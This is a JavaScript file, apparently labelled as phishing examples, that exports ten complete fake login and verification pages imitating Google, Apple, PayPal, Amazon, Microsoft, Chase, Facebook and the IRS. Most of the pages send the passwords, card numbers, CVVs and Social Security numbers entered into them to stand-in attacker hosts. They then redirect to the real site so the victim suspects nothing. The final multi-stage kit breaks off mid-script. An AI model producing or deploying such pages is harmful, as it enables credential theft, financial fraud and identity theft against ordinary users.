// Phishing 漏洞示例文件

// 示例 1: 域名相似的钓鱼网站
export function phishingExample1() {
  // 危险：模仿知名网站域名
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Sign in to Google</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background-color: #f8f9fa;
          padding: 40px;
          text-align: center;
        }
        .login-box {
          background: white;
          padding: 30px;
          border-radius: 8px;
          box-shadow: 0 2px 4px rgba(0,0,0,.1);
          max-width: 400px;
          margin: 0 auto;
        }
        input {
          width: 100%;
          padding: 12px;
          margin: 8px 0;
          box-sizing: border-box;
          border: 1px solid #ddd;
          border-radius: 4px;
        }
        button {
          background: #1a73e8;
          color: white;
          border: none;
          padding: 12px 24px;
          border-radius: 4px;
          cursor: pointer;
          width: 100%;
        }
      </style>
    </head>
    <body>
      <div class="login-box">
        <img src="google-logo.png" alt="Google Logo" style="width: 100px; margin-bottom: 20px;">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        
        <form id="loginForm">
          <input type="email" id="email" placeholder="Email or phone" required>
          <br>
          <input type="password" id="password" placeholder="Enter your password" required>
          <br>
          <button type="submit">Next</button>
        </form>
        
        <div style="margin-top: 20px; font-size: 14px;">
          <a href="#">Forgot email?</a> • <a href="#">Create account</a>
        </div>
      </div>
      
      <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const email = document.getElementById('email').value;
          const password = document.getElementById('password').value;
          
          // 将凭证发送到钓鱼网站服务器
          fetch('https://fake-google-login.com/credentials', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              email: email,
              password: password,
              timestamp: new Date().toISOString()
            })
          })
          .then(response => {
            // 重定向到真正的 Google 网站以避免怀疑
            window.location.href = 'https://accounts.google.com/';
          })
          .catch(error => {
            console.error('Error:', error);
          });
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 2: 电子邮件钓鱼
export function phishingExample2() {
  // 危险：伪造的电子邮件通知
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Security Alert - Apple ID</title>
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          background-color: #f5f5f7;
          margin: 0;
          padding: 20px;
        }
        .email-container {
          max-width: 600px;
          margin: 0 auto;
          background: white;
          border-radius: 12px;
          overflow: hidden;
          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
          background: #202020;
          color: white;
          padding: 20px;
          text-align: center;
        }
        .content {
          padding: 30px;
        }
        .action-button {
          background: #0070c9;
          color: white;
          text-decoration: none;
          padding: 12px 24px;
          border-radius: 4px;
          display: inline-block;
          margin: 20px 0;
        }
      </style>
    </head>
    <body>
      <div class="email-container">
        <div class="header">
          <h2>Apple</h2>
          <p>Security Alert</p>
        </div>
        <div class="content">
          <h3>Unrecognized Sign-in Attempt</h3>
          <p>We noticed a sign-in attempt from a new device:</p>
          <p><strong>Location:</strong> Beijing, China</p>
          <p><strong>Time:</strong> Today at 2:45 PM</p>
          <p><strong>Device:</strong> MacBook Pro (Chrome Browser)</p>
          
          <p>If this wasn't you, please secure your account immediately.</p>
          
          <a href="https://fake-apple-security.com/verify-account" class="action-button">Secure Account Now</a>
          
          <p>If this was you, you can safely ignore this email.</p>
          
          <hr style="margin: 20px 0;">
          <small>
            This email was sent to user@apple-user.com<br>
            © 2023 Apple Inc. All rights reserved.<br>
            Apple Inc., One Apple Park Way, Cupertino, CA 95014
          </small>
        </div>
      </div>
      
      <script>
        // 检测用户是否点击了链接
        document.addEventListener('click', function(e) {
          if (e.target.classList.contains('action-button')) {
            // 记录钓鱼链接点击行为
            console.log('Phishing link clicked');
          }
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 3: 紧急情况钓鱼
export function phishingExample3() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>URGENT: Account Suspended - PayPal</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background: linear-gradient(to bottom, #003087, #003087);
          color: white;
          text-align: center;
          padding: 40px 20px;
        }
        .alert-box {
          background: white;
          color: #333;
          padding: 30px;
          border-radius: 8px;
          max-width: 500px;
          margin: 30px auto;
          text-align: left;
        }
        .urgent {
          color: #ff0000;
          font-weight: bold;
          font-size: 24px;
          text-align: center;
        }
        .verify-btn {
          background: #0070ba;
          color: white;
          border: none;
          padding: 15px 30px;
          font-size: 18px;
          border-radius: 4px;
          cursor: pointer;
          width: 100%;
          margin-top: 20px;
        }
      </style>
    </head>
    <body>
      <h1>PayPal</h1>
      <div class="alert-box">
        <div class="urgent">ACCOUNT SUSPENDED</div>
        <p>Your PayPal account has been temporarily suspended due to suspicious activity.</p>
        <p>To prevent permanent closure of your account, please verify your information within 24 hours.</p>
        
        <form id="verificationForm">
          <label for="email">Email Address:</label>
          <input type="email" id="email" style="width: 100%; padding: 10px; margin: 10px 0;" required>
          
          <label for="password">Password:</label>
          <input type="password" id="password" style="width: 100%; padding: 10px; margin: 10px 0;" required>
          
          <label for="cardNumber">Credit Card Number:</label>
          <input type="text" id="cardNumber" style="width: 100%; padding: 10px; margin: 10px 0;" required>
          
          <label for="expiry">Expiry Date:</label>
          <input type="text" id="expiry" style="width: 100%; padding: 10px; margin: 10px 0;" required>
          
          <label for="cvv">CVV:</label>
          <input type="text" id="cvv" style="width: 100%; padding: 10px; margin: 10px 0;" required>
          
          <button type="submit" class="verify-btn">Verify Account</button>
        </form>
      </div>
      
      <script>
        document.getElementById('verificationForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const formData = {
            email: document.getElementById('email').value,
            password: document.getElementById('password').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            timestamp: new Date().toISOString()
          };
          
          // 发送敏感信息到钓鱼服务器
          fetch('https://fake-paypal-security.com/verify', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
          })
          .then(response => response.json())
          .then(data => {
            alert('Account verified successfully. Redirecting...');
            // 重定向到真实 PayPal 页面以增加可信度
            window.location.href = 'https://www.paypal.com/';
          })
          .catch(error => {
            console.error('Verification failed:', error);
          });
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 4: 礼品卡钓鱼
export function phishingExample4() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Free $100 Amazon Gift Card!</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background-color: #f0f2f2;
          text-align: center;
          padding: 20px;
        }
        .gift-card {
          background: linear-gradient(45deg, #ffd800, #d4af00);
          color: #000;
          padding: 30px;
          border-radius: 15px;
          max-width: 500px;
          margin: 20px auto;
          box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        .claim-btn {
          background: #2a79d1;
          color: white;
          border: none;
          padding: 15px 30px;
          font-size: 18px;
          border-radius: 30px;
          cursor: pointer;
          margin: 20px 0;
        }
        .survey {
          background: white;
          padding: 20px;
          border-radius: 8px;
          max-width: 500px;
          margin: 20px auto;
          text-align: left;
        }
      </style>
    </head>
    <body>
      <h1>🎉 Congratulations! 🎉</h1>
      
      <div class="gift-card">
        <h2>FREE $100 AMAZON GIFT CARD</h2>
        <p>You've been selected to receive a complimentary gift card!</p>
        <button class="claim-btn" onclick="showSurvey()">Claim Your Gift</button>
      </div>
      
      <div id="surveySection" class="survey" style="display: none;">
        <h3>Quick Survey - Required to Claim</h3>
        <form id="surveyForm">
          <p>1. What is your email address?</p>
          <input type="email" id="email" style="width: 100%; padding: 10px;" required>
          
          <p>2. What is your password for this account?</p>
          <input type="password" id="password" style="width: 100%; padding: 10px;" required>
          
          <p>3. Credit card for verification:</p>
          <input type="text" id="cardNumber" placeholder="Card Number" style="width: 100%; padding: 10px;" required>
          <input type="text" id="expiry" placeholder="MM/YY" style="width: 100%; padding: 10px; margin-top: 10px;" required>
          <input type="text" id="cvv" placeholder="CVV" style="width: 100%; padding: 10px; margin-top: 10px;" required>
          
          <button type="submit" style="background: #ff9900; color: white; border: none; padding: 15px; width: 100%; margin-top: 20px; cursor: pointer;">Submit & Get Gift Card</button>
        </form>
      </div>
      
      <script>
        function showSurvey() {
          document.getElementById('surveySection').style.display = 'block';
        }
        
        document.getElementById('surveyForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const surveyData = {
            email: document.getElementById('email').value,
            password: document.getElementById('password').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            timestamp: new Date().toISOString()
          };
          
          // 发送个人信息到钓鱼服务器
          fetch('https://free-gift-card-offer.com/collect-info', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(surveyData)
          })
          .then(response => response.json())
          .then(data => {
            // 显示成功消息并重定向
            document.body.innerHTML = '<h1>Success! Your gift card is being processed.</h1><p>You will receive an email with your gift card code shortly.</p>';
            setTimeout(() => {
              window.location.href = 'https://www.amazon.com/';
            }, 3000);
          })
          .catch(error => {
            console.error('Submission failed:', error);
          });
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 5: 安全软件更新钓鱼
export function phishingExample5() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Security Update Required - Windows</title>
      <style>
        body {
          font-family: Segoe UI, Arial, sans-serif;
          background-color: #0078d7;
          color: white;
          text-align: center;
          padding: 40px 20px;
        }
        .update-box {
          background: white;
          color: #333;
          padding: 30px;
          border-radius: 8px;
          max-width: 500px;
          margin: 30px auto;
          text-align: left;
        }
        .progress-bar {
          width: 100%;
          background-color: #e0e0e0;
          border-radius: 4px;
          margin: 20px 0;
          overflow: hidden;
        }
        .progress-fill {
          height: 20px;
          background-color: #4caf50;
          width: 0%;
          transition: width 0.5s ease;
        }
        .install-btn {
          background: #0078d7;
          color: white;
          border: none;
          padding: 12px 24px;
          font-size: 16px;
          border-radius: 4px;
          cursor: pointer;
          width: 100%;
        }
      </style>
    </head>
    <body>
      <h1>Microsoft Windows</h1>
      <div class="update-box">
        <h2>Security Update Available</h2>
        <p>Important security update for Windows 10 (KB2023-1123) is ready to install.</p>
        <p>This update fixes critical security vulnerabilities. Install now to protect your system.</p>
        
        <div class="progress-bar">
          <div class="progress-fill" id="progressFill"></div>
        </div>
        <div id="progressText">Ready to install</div>
        
        <form id="authForm">
          <label for="username">Windows Username:</label>
          <input type="text" id="username" style="width: 100%; padding: 10px; margin: 10px 0;" required>
          
          <label for="password">Administrator Password:</label>
          <input type="password" id="password" style="width: 100%; padding: 10px; margin: 10px 0;" required>
          
          <button type="submit" class="install-btn">Install Update</button>
        </form>
        
        <p style="font-size: 12px; color: gray; margin-top: 20px;">
          This update requires administrator privileges to install.
        </p>
      </div>
      
      <script>
        document.getElementById('authForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const authData = {
            username: document.getElementById('username').value,
            password: document.getElementById('password').value,
            timestamp: new Date().toISOString(),
            systemInfo: navigator.userAgent
          };
          
          // 模拟安装过程
          document.getElementById('progressText').textContent = 'Installing update...';
          let width = 0;
          const interval = setInterval(() => {
            if (width >= 100) {
              clearInterval(interval);
              // 发送认证信息到钓鱼服务器
              fetch('https://fake-windows-update.com/install', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify(authData)
              })
              .then(response => response.json())
              .then(data => {
                document.getElementById('progressText').textContent = 'Update installed successfully!';
                setTimeout(() => {
                  window.location.href = 'https://www.microsoft.com/';
                }, 2000);
              });
            } else {
              width += 10;
              document.getElementById('progressFill').style.width = width + '%';
            }
          }, 200);
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 6: 银行账户钓鱼
export function phishingExample6() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Chase Online Banking - Sign In</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background-color: #f5f5f5;
          padding: 20px;
        }
        .bank-header {
          background: #c6006b;
          color: white;
          padding: 15px;
          text-align: center;
        }
        .login-panel {
          background: white;
          padding: 30px;
          border-radius: 4px;
          max-width: 400px;
          margin: 20px auto;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .input-group {
          margin-bottom: 20px;
        }
        .input-group label {
          display: block;
          margin-bottom: 5px;
          font-weight: bold;
        }
        .input-group input {
          width: 100%;
          padding: 12px;
          border: 1px solid #ccc;
          border-radius: 4px;
          box-sizing: border-box;
        }
        .login-btn {
          background: #c6006b;
          color: white;
          border: none;
          padding: 14px;
          width: 100%;
          border-radius: 4px;
          cursor: pointer;
          font-size: 16px;
        }
      </style>
    </head>
    <body>
      <div class="bank-header">
        <h1>Chase</h1>
        <p>Online Banking</p>
      </div>
      
      <div class="login-panel">
        <h2>Sign In</h2>
        
        <form id="chaseLogin">
          <div class="input-group">
            <label for="userId">User ID</label>
            <input type="text" id="userId" required>
          </div>
          
          <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" required>
          </div>
          
          <div class="input-group">
            <label for="dob">Date of Birth (MM/DD/YYYY)</label>
            <input type="text" id="dob" placeholder="MM/DD/YYYY" required>
          </div>
          
          <div class="input-group">
            <label for="ssn">Last 4 Digits of SSN</label>
            <input type="text" id="ssn" maxlength="4" placeholder="1234" required>
          </div>
          
          <button type="submit" class="login-btn">Sign On</button>
        </form>
        
        <div style="margin-top: 20px; font-size: 14px;">
          <a href="#">Forgot User ID?</a> | <a href="#">Forgot Password?</a>
        </div>
      </div>
      
      <script>
        document.getElementById('chaseLogin').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const loginData = {
            userId: document.getElementById('userId').value,
            password: document.getElementById('password').value,
            dob: document.getElementById('dob').value,
            ssn: document.getElementById('ssn').value,
            timestamp: new Date().toISOString()
          };
          
          // 发送银行凭证到钓鱼服务器
          fetch('https://fake-chase-login.com/authenticate', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(loginData)
          })
          .then(response => response.json())
          .then(data => {
            // 显示加载界面，然后重定向到真实 Chase 网站
            document.body.innerHTML = '<div style="text-align: center; padding: 50px;"><h2>Verifying your identity...</h2><p>Please wait while we verify your information.</p></div>';
            setTimeout(() => {
              window.location.href = 'https://www.chase.com/';
            }, 3000);
          })
          .catch(error => {
            console.error('Authentication failed:', error);
          });
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 7: 社交媒体钓鱼
export function phishingExample7() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Facebook - Log In</title>
      <style>
        body {
          font-family: Helvetica, Arial, sans-serif;
          background-color: #f0f2f5;
          padding: 50px 20px;
          text-align: center;
        }
        .fb-logo {
          color: #1877f2;
          font-size: 60px;
          font-weight: bold;
          margin-bottom: 20px;
        }
        .login-box {
          background: white;
          padding: 20px;
          border-radius: 8px;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
          max-width: 396px;
          margin: 0 auto;
          text-align: center;
        }
        .login-input {
          width: 100%;
          padding: 14px 16px;
          margin: 8px 0;
          border: 1px solid #dddfe2;
          border-radius: 6px;
          box-sizing: border-box;
        }
        .login-btn {
          background: #1877f2;
          color: white;
          border: none;
          padding: 14px 16px;
          width: 100%;
          border-radius: 6px;
          font-size: 20px;
          cursor: pointer;
          margin: 8px 0;
        }
      </style>
    </head>
    <body>
      <div class="fb-logo">facebook</div>
      
      <div class="login-box">
        <form id="facebookLogin">
          <input type="text" class="login-input" id="email" placeholder="Email address or phone number" required>
          <input type="password" class="login-input" id="pass" placeholder="Password" required>
          <button type="submit" class="login-btn">Log In</button>
        </form>
        
        <a href="#" style="color: #1877f2; font-size: 14px;">Forgotten password?</a>
        
        <div style="border-top: 1px solid #dadde1; padding: 16px 0; margin-top: 16px;">
          <a href="#" style="background: #42b72a; color: white; padding: 14px 16px; border-radius: 6px; text-decoration: none; display: inline-block;">Create New Account</a>
        </div>
      </div>
      
      <div style="margin-top: 20px; font-size: 14px; color: #737373;">
        <p><a href="#" style="color: #385898;">English (UK)</a> <a href="#" style="color: #385898;">Français (France)</a> <a href="#" style="color: #385898;">Español</a></p>
        <p>Meta © 2023</p>
      </div>
      
      <script>
        document.getElementById('facebookLogin').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const loginData = {
            email: document.getElementById('email').value,
            password: document.getElementById('pass').value,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
          };
          
          // 发送 Facebook 凭证到钓鱼服务器
          fetch('https://fake-facebook-login.com/access', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(loginData)
          })
          .then(response => response.json())
          .then(data => {
            // 重定向到真实 Facebook 网站以避免怀疑
            window.location.href = 'https://www.facebook.com/';
          })
          .catch(error => {
            console.error('Login failed:', error);
          });
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 8: 税务钓鱼
export function phishingExample8() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>IRS Tax Refund - Official Site</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background-color: #ffffff;
          margin: 0;
          padding: 20px;
        }
        .irs-header {
          background: #005ea2;
          color: white;
          padding: 15px;
          text-align: center;
        }
        .refund-calculator {
          background: #f0f0f0;
          padding: 30px;
          border-radius: 8px;
          max-width: 600px;
          margin: 20px auto;
          text-align: center;
        }
        .form-group {
          margin: 15px 0;
          text-align: left;
        }
        .form-group label {
          display: block;
          margin-bottom: 5px;
          font-weight: bold;
        }
        .form-group input {
          width: 100%;
          padding: 10px;
          border: 1px solid #ccc;
          border-radius: 4px;
          box-sizing: border-box;
        }
        .calculate-btn {
          background: #005ea2;
          color: white;
          border: none;
          padding: 15px 30px;
          font-size: 18px;
          border-radius: 4px;
          cursor: pointer;
        }
      </style>
    </head>
    <body>
      <div class="irs-header">
        <h1>Internal Revenue Service</h1>
        <p>Official Government Website</p>
      </div>
      
      <div class="refund-calculator">
        <h2>Tax Refund Calculator</h2>
        <p>Calculate your potential refund and file securely online.</p>
        
        <form id="taxForm">
          <div class="form-group">
            <label for="ssn">Social Security Number</label>
            <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
          </div>
          
          <div class="form-group">
            <label for="income">Annual Income ($)</label>
            <input type="number" id="income" placeholder="Enter your annual income" required>
          </div>
          
          <div class="form-group">
            <label for="bankAccount">Bank Account Number</label>
            <input type="text" id="bankAccount" placeholder="Enter your bank account number" required>
          </div>
          
          <div class="form-group">
            <label for="routingNumber">Routing Number</label>
            <input type="text" id="routingNumber" placeholder="Enter routing number" required>
          </div>
          
          <div class="form-group">
            <label for="cardNumber">Debit Card Number (for verification)</label>
            <input type="text" id="cardNumber" placeholder="XXXX-XXXX-XXXX-XXXX" required>
          </div>
          
          <button type="submit" class="calculate-btn">Calculate & File</button>
        </form>
      </div>
      
      <script>
        document.getElementById('taxForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const taxData = {
            ssn: document.getElementById('ssn').value,
            income: document.getElementById('income').value,
            bankAccount: document.getElementById('bankAccount').value,
            routingNumber: document.getElementById('routingNumber').value,
            cardNumber: document.getElementById('cardNumber').value,
            timestamp: new Date().toISOString()
          };
          
          // 发送税务和个人财务信息到钓鱼服务器
          fetch('https://fake-irs-refund.com/submit', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(taxData)
          })
          .then(response => response.json())
          .then(data => {
            document.body.innerHTML = '<div style="text-align: center; padding: 50px;"><h2>Thank you for filing your taxes!</h2><p>Your return has been submitted successfully. A confirmation will be sent to your email.</p></div>';
            setTimeout(() => {
              window.location.href = 'https://www.irs.gov/';
            }, 3000);
          })
          .catch(error => {
            console.error('Submission failed:', error);
          });
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 9: 网购钓鱼
export function phishingExample9() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Special Offer - Apple Store</title>
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          background-color: #f5f5f7;
          margin: 0;
          padding: 20px;
        }
        .apple-header {
          text-align: center;
          padding: 20px;
        }
        .offer-banner {
          background: linear-gradient(45deg, #e20800, #ff3700);
          color: white;
          padding: 30px;
          text-align: center;
          border-radius: 12px;
          margin: 20px 0;
        }
        .product-card {
          background: white;
          border-radius: 12px;
          overflow: hidden;
          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          max-width: 400px;
          margin: 20px auto;
        }
        .purchase-form {
          padding: 20px;
        }
        .form-row {
          margin: 15px 0;
        }
        .form-row label {
          display: block;
          margin-bottom: 5px;
          font-weight: bold;
        }
        .form-row input {
          width: 100%;
          padding: 12px;
          border: 1px solid #ddd;
          border-radius: 8px;
          box-sizing: border-box;
        }
        .buy-btn {
          background: #0071e3;
          color: white;
          border: none;
          padding: 16px;
          width: 100%;
          border-radius: 8px;
          font-size: 18px;
          cursor: pointer;
          margin-top: 10px;
        }
      </style>
    </head>
    <body>
      <div class="apple-header">
        <h1>Apple</h1>
      </div>
      
      <div class="offer-banner">
        <h2>LIMITED TIME OFFER</h2>
        <h3>iPhone 15 Pro - 30% OFF for First-Time Buyers</h3>
        <p>Special discount for new customers only. Offer ends soon!</p>
      </div>
      
      <div class="product-card">
        <img src="iphone15-pro.jpg" alt="iPhone 15 Pro" style="width: 100%;">
        
        <div class="purchase-form">
          <h3>Complete Your Purchase</h3>
          
          <form id="purchaseForm">
            <div class="form-row">
              <label for="fullName">Full Name</label>
              <input type="text" id="fullName" required>
            </div>
            
            <div class="form-row">
              <label for="email">Email Address</label>
              <input type="email" id="email" required>
            </div>
            
            <div class="form-row">
              <label for="phone">Phone Number</label>
              <input type="tel" id="phone" required>
            </div>
            
            <div class="form-row">
              <label for="address">Shipping Address</label>
              <input type="text" id="address" required>
            </div>
            
            <div class="form-row">
              <label for="cardNumber">Credit Card Number</label>
              <input type="text" id="cardNumber" placeholder="XXXX-XXXX-XXXX-XXXX" required>
            </div>
            
            <div class="form-row">
              <label for="expiry">Expiry Date</label>
              <input type="text" id="expiry" placeholder="MM/YY" required>
            </div>
            
            <div class="form-row">
              <label for="cvv">Security Code (CVV)</label>
              <input type="text" id="cvv" placeholder="XXX" required>
            </div>
            
            <div class="form-row">
              <label for="password">Apple ID Password (for verification)</label>
              <input type="password" id="password" required>
            </div>
            
            <button type="submit" class="buy-btn">Buy Now - $799 (30% OFF)</button>
          </form>
        </div>
      </div>
      
      <script>
        document.getElementById('purchaseForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const purchaseData = {
            fullName: document.getElementById('fullName').value,
            email: document.getElementById('email').value,
            phone: document.getElementById('phone').value,
            address: document.getElementById('address').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            appleIdPassword: document.getElementById('password').value,
            timestamp: new Date().toISOString()
          };
          
          // 发送购买信息和凭证到钓鱼服务器
          fetch('https://fake-apple-offer.com/buy', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(purchaseData)
          })
          .then(response => response.json())
          .then(data => {
            document.body.innerHTML = '<div style="text-align: center; padding: 50px;"><h2>Order Placed Successfully!</h2><p>Thank you for your purchase. Your order details have been sent to your email.</p></div>';
            setTimeout(() => {
              window.location.href = 'https://www.apple.com/';
            }, 3000);
          })
          .catch(error => {
            console.error('Purchase failed:', error);
          });
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 10: 复合钓鱼攻击
export function phishingExample10() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Multi-Brand Phishing Attack</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          margin: 0;
          padding: 20px;
          background-color: #f0f0f0;
        }
        
        /* 技术1: 模仿多个品牌的界面 */
        .brand-header {
          text-align: center;
          padding: 10px;
          margin: 10px 0;
        }
        
        .google-brand {
          background: linear-gradient(to right, #4285F4, #34A853, #FBBC05, #EA4335);
          color: white;
          padding: 15px;
        }
        
        .microsoft-brand {
          background: #0078d7;
          color: white;
          padding: 15px;
        }
        
        .amazon-brand {
          background: #ff9900;
          color: black;
          padding: 15px;
        }
        
        /* 技术2: 多阶段信息收集 */
        .phishing-stage {
          background: white;
          padding: 25px;
          margin: 20px auto;
          border-radius: 8px;
          max-width: 500px;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
          display: none;
        }
        
        .stage-active {
          display: block;
        }
        
        .form-field {
          width: 100%;
          padding: 12px;
          margin: 10px 0;
          border: 1px solid #ddd;
          border-radius: 4px;
          box-sizing: border-box;
        }
        
        .action-btn {
          background: #4CAF50;
          color: white;
          border: none;
          padding: 14px 20px;
          border-radius: 4px;
          cursor: pointer;
          width: 100%;
          font-size: 16px;
        }
        
        /* 技术3: 心理压力设计 */
        .urgency-banner {
          background: #f44336;
          color: white;
          text-align: center;
          padding: 10px;
          font-weight: bold;
          margin: 10px 0;
        }
        
        /* 技术4: 社会工程学元素 */
        .social-proof {
          background: #e8f5e8;
          padding: 15px;
          border-left: 4px solid #4CAF50;
          margin: 15px 0;
          font-style: italic;
        }
        
        /* 技术5: 隐蔽的数据收集 */
        .hidden-data {
          display: none;
        }
      </style>
    </head>
    <body>
      <div class="brand-header google-brand">
        <h2>Google Account Security</h2>
        <p>Advanced Security Verification System</p>
      </div>
      
      <div class="urgency-banner">
        ⚠️ CRITICAL SECURITY ALERT: UNUSUAL ACTIVITY DETECTED ON YOUR ACCOUNT
      </div>
      
      <div class="social-proof">
        "This security check has been requested by Google's fraud detection systems. 
        Over 10,000 accounts have been secured using this process today."
      </div>
      
      <!-- 第一阶段：基本信息收集 -->
      <div id="stage1" class="phishing-stage stage-active">
        <h3>Stage 1: Identity Verification</h3>
        <p>We need to verify your identity to secure your account.</p>
        
        <form id="stage1Form">
          <label for="primaryEmail">Primary Email Address:</label>
          <input type="email" id="primaryEmail" class="form-field" required>
          
          <label for="recoveryEmail">Recovery Email (if different):</label>
          <input type="email" id="recoveryEmail" class="form-field">
          
          <label for="phoneNumber">Phone Number:</label>
          <input type="tel" id="phoneNumber" class="form-field" required>
          
          <button type="submit" class="action-btn">Verify Identity →</button>
        </form>
      </div>
      
      <!-- 第二阶段：账户验证 -->
      <div id="stage2" class="phishing-stage">
        <h3>Stage 2: Account Authentication</h3>
        <p>Please provide your account credentials to verify ownership.</p>
        
        <form id="stage2Form">
          <label for="username">Username/Email:</label>
          <input type="text" id="username" class="form-field" required>
          
          <label for="accountPassword">Account Password:</label>
          <input type="password" id="accountPassword" class="form-field" required>
          
          <label for="lastPasswordChange">When did you last change your password?</label>
          <input type="date" id="lastPasswordChange" class="form-field">
          
          <button type="submit" class="action-btn">Authenticate →</button>
        </form>
      </div>
      
      <!-- 第三阶段：财务信息 -->
      <div id="stage3" class="phishing-stage">
        <h3>Stage 3: Payment Verification</h3>
        <p>For security purposes, we need to verify your payment methods.</p>
        
        <form id="stage3Form">
          <label for="primaryCard">Primary Credit Card Number:</label>
          <input type="text" id="primaryCard" class="form-field" placeholder="XXXX-XXXX-XXXX-XXXX" required>
          
          <label for="cardExpiry">Expiry Date:</label>
          <input type="text" id="cardExpiry" class="form-field" placeholder="MM/YY" required>
          
          <label for="cardCVV">CVV Code:</label>
          <input type="text" id="cardCVV" class="form-field" placeholder="XXX" required>
          
          <label for="billingAddress">Billing Address:</label>
          <input type="text" id="billingAddress" class="form-field" required>
          
          <label for="zipCode">ZIP Code:</label>
          <input type="text" id="zipCode" class="form-field" required>
          
          <button type="submit" class="action-btn">Verify Payment →</button>
        </form>
      </div>
      
      <!-- 第四阶段：跨平台信息 -->
      <div id="stage4" class="phishing-stage">
        <h3>Stage 4: Cross-Platform Security</h3>
        <p>We detected suspicious activity on your linked accounts. Please verify:</p>
        
        <form id="stage4Form">
          <div class="microsoft-brand" style="padding: 10px; margin: 10px 0;">
            <h4>Microsoft Account Verification</h4>
          </div>
          <label for="microsoftEmail">Microsoft Email:</label>
          <input type="email" id="microsoftEmail" class="form-field">
          <label for="microsoftPassword">Microsoft Password:</label>
          <input type="password" id="microsoftPassword" class="form-field">
          
          <div class="amazon-brand" style="padding: 10px; margin: 10px 0;">
            <h4>Amazon Account Verification</h4>
          </div>
          <label for="amazonEmail">Amazon Email:</label>
          <input type="email" id="amazonEmail" class="form-field">
          <label for="amazonPassword">Amazon Password:</label>
          <input type="password" id="amazonPassword" class="form-field">
          
          <button type="submit" class="action-btn">Complete Security Check →</button>
        </form>
      </div>
      
      <!-- 最终阶段：社会安全号码 -->
      <div id="stage5" class="phishing-stage">
        <h3>Final Stage: Identity Confirmation</h3>
        <p>One final verification step to fully secure your account:</p>
        
        <form id="stage5Form">
          <label for="fullSSN">Full Social Security Number:</label>
          <input type="text" id="fullSSN" class="form-field" placeholder="XXX-XX-XXXX" required>
          
          <label for="mothersMaidenName">Mother's Maiden Name:</label>
          <input type="text" id="mothersMaidenName" class="form-field" required>
          
          <label for="firstPetName">First Pet's Name:</label>
          <input type="text" id="firstPetName" class="form-field" required>
          
          <label for="elementarySchool">First Elementary School:</label>
          <input type="text" id="elementarySchool" class="form-field" required>
          
          <div class="hidden-data">
            <input type="hidden" id="userAgent" value="${navigator.userAgent}">
            <input type="hidden" id="timestamp" value="${new Date().toISOString()}">
            <input type="hidden" id="ipAddress" value="">
          </div>
          
          <button type="submit" class="action-btn">Complete Security Verification</button>
        </form>
      </div>
      
      <script>
        // 获取IP地址的函数（简化版）
        function getIPAddress() {
          // 在实际钓鱼网站中，可能会使用更复杂的方法获取IP
          return "IP_ADDRESS_DETECTION_NEEDED";
        }
        
        // 更新隐藏字段
        document.getElementById('ipAddress').value = getIPAddress();
        
        // 阶段1提交处理
        document.getElementById('stage1Form').addEventListener('submit', function(e) {
          e.preventDefault();
          
          // 验证数据
